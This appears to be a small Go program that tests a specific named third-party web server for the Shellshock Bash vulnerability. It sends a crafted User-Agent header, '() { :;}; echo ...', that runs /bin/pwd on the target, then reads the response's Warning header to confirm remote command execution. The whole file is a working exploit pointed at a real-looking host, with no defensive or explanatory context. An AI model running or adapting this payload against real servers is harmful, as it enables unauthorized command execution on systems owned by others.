package main

import (
	"fmt"
	"net/http"
)

func main () {
	url := "http://niopub.nio.org/cgi-bin/niopub/pub.sh?tag5001=JayaKumar,%20S"

	client := &http.Client{}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", "() { :;}; echo \"Warning: `/bin/pwd`\"")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
	}

	/*if resp.Header["Warning"][0] == "Server Vulnerable" {
		fmt.Println(url)
	}*/
	fmt.Println(resp.Header["Warning"])
}
